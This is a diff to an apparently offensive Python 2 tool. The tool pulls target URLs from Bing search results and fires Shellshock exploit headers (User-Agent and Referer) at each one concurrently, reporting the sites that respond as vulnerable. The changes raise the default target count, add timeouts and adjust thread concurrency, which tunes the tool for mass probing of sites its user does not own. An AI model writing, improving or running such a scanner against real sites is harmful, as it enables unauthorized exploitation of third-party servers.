@@ -22,7 +22,7 @@ def parse_args():
    ''' Create the arguments '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--search", help="Search terms")
-   parser.add_argument("-l", "--limit", default="10", help="Limit number of results")
+   parser.add_argument("-l", "--limit", default="100", help="Limit number of results")
    parser.add_argument("-k", "--key", help="Your Bing API key found at https://datamarket.azure.com/account")
    return parser.parse_args()
 
@@ -41,7 +41,7 @@ def bing_search(query, limit, key, **kwargs):
     handler = urllib2.HTTPBasicAuthHandler(password_mgr)
     opener = urllib2.build_opener(handler)
     urllib2.install_opener(opener)
-    readURL = urllib2.urlopen(url).read()
+    readURL = urllib2.urlopen(url, timeout=90).read()
     return readURL
 
 def action(result):
@@ -55,8 +55,8 @@ def action(result):
     req.add_header('User-Agent', ua)
     req.add_header('Referer', exploit)
     try:
-        r = urllib2.urlopen(req)
-    except Exception:
+        r = urllib2.urlopen(req, timeout=90)
+    except Exception as e:
         return
     resp_headers = r.info()
     if 'shellshock' in r.info():
@@ -64,8 +64,8 @@ def action(result):
         print '[!] SHELLSHOCK VULNERABLE:', url
 
 def result_concurrency(results):
-    ''' Do some current actions to the results '''
-    in_parallel = 500 
+    ''' Open all the greenlet threads '''
+    in_parallel = 50
     pool = Pool(in_parallel)
     jobs = [pool.spawn(action, result) for result in results]
     return joinall(jobs)
@@ -81,6 +81,7 @@ def main():
     limit = int(args.limit)
     response = bing_search(query, limit, key)
     results = json.loads(response)['d']['results']
+    print 'Results from this query: ' + str(len(results))
     result_concurrency(results)
     if not VULN_FOUND:
         print 'No vulnerable sites found'
